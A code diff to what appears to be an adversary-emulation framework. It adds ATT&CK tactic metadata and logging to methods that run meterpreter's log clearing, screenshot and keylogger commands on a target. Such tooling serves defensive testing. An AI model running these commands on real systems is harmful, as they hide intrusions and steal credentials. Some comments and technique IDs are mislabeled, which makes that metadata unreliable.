@@ -600,29 +600,41 @@ Elevate privileges from local administrator to SYSTEM. Three ways to do that wil
                                                   result=res)
         return res
 
-    def clearev(self, target):
+    def clearev(self, target, **kwargs):
         """ Clears windows event logs """
 
         command = "clearev"
         ttp = "T1070.001"   # It uses one out of three different ways to elevate privileges.
+        tactics = "Defense Evasion"
+        tactics_id = "TA0005"
+        description = """
+Clear windows event logs to hide tracks
+        """
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
 
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="clearev",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description", None),
+                                                           countermeasure=kwargs.get("countermeasure", None))
         res = self.meterpreter_execute_on([command], target)
         print(res)
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
+                                                  logid=logid,
                                                   result=res)
         return res
 
-    def screengrab(self, target):
+    def screengrab(self, target, **kwargs):
         """ Creates a screenshot
 
         Before using it, migrate to a process running while you want to monitor.
@@ -631,14 +643,25 @@ Elevate privileges from local administrator to SYSTEM. Three ways to do that wil
 
         command = "screengrab"
         ttp = "T1113"   # It uses one out of three different ways to elevate privileges.
+        tactics = "Collection"
+        tactics_id = "TA0009"
+        description = """
+Do screen grabbing to collect data on target
+        """
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
 
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="screengrab",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description", None),
+                                                           countermeasure=kwargs.get("countermeasure", None))
         res = self.meterpreter_execute_on(["use espia"], target)
         print(res)
         res = self.meterpreter_execute_on([command], target)
@@ -647,10 +670,11 @@ Elevate privileges from local administrator to SYSTEM. Three ways to do that wil
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
+                                                  logid=logid,
                                                   result=res)
         return res
 
-    def keylogging(self, target, monitoring_time):
+    def keylogging(self, target, monitoring_time, **kwargs):
         """ Starts keylogging
 
         Before using it, migrate to a process running while you want to monitor.
@@ -658,19 +682,29 @@ Elevate privileges from local administrator to SYSTEM. Three ways to do that wil
         "winlogon.exe" will monitor user logins. "explorer.exe" during the session.
 
         @param monitoring_time: Seconds the keylogger is running
-        @param monitoring_time: The time to monitor the keys. In seconds
         """
 
         command = "keyscan_start"
         ttp = "T1056.001"   # It uses one out of three different ways to elevate privileges.
+        tactics = "Collection"
+        tactics_id = "TA0009"
+        description = """
+Log keys to get passwords and other credentials
+        """
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
 
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="keylogging",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description", None),
+                                                           countermeasure=kwargs.get("countermeasure", None))
         res = self.meterpreter_execute_on([command], target)
         print(res)
         time.sleep(monitoring_time)
@@ -680,54 +714,80 @@ Elevate privileges from local administrator to SYSTEM. Three ways to do that wil
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
+                                                  logid=logid,
                                                   result=res)
         return res
 
-    def getuid(self, target):
+    def getuid(self, target, **kwargs):
         """ Returns the UID
 
         """
 
         command = "getuid"
         ttp = "T1056.001"   # It uses one out of three different ways to elevate privileges.
+        tactics = "Collection"
+        tactics_id = "TA0009"
+        description = """
+Get user id
+        """
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
 
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="getuid",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description", None),
+                                                           countermeasure=kwargs.get("countermeasure", None))
         res = self.meterpreter_execute_on([command], target)
 
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
+                                                  logid=logid,
                                                   result=res)
+
         return res[0]
 
-    def sysinfo(self, target):
+    def sysinfo(self, target, **kwargs):
         """ Returns the sysinfo
 
         """
 
         command = "sysinfo"
         ttp = "T1082"   # It uses one out of three different ways to elevate privileges.
+        tactics = "Discovery"
+        tactics_id = "TA0007"
+        description = """
+Get basic system information
+        """
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
 
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           ttp=ttp,
+                                                           name="sysinfo",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           situation_description=kwargs.get("situation_description", None),
+                                                           countermeasure=kwargs.get("countermeasure", None))
         res = self.meterpreter_execute_on([command], target)
 
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
+                                                  logid=logid,
                                                   result=res)
         return res[0]
 
